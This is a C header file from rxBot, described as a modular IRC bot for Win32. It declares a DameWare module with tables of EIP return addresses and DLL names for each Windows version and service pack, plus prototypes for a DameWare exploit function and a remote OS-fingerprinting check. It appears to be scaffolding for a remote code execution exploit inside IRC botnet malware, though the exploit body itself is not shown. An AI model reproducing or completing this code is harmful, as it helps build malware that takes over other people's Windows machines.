/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#ifndef NO_DAMEWARE

#define ID_UNKNOWN	0
#define ID_WIN2K	1
#define ID_WINXP	2
#define ID_WIN2K3	3
#define ID_WINNT	4
#define VER			"0.5"

typedef struct sp_levels 
{	
	unsigned long eip;
	char library[20]; 

} SP_LEVELS; 

typedef struct target_os
{ 
	//int sp; 
	//unsigned long eip; 
	char os_type[10]; 
	struct sp_levels sp[7]; 

} TARGET_OS;


BOOL DameWare(EXINFO exinfo);
int check_os(char *host, unsigned short target_port, int *sp); 
#endif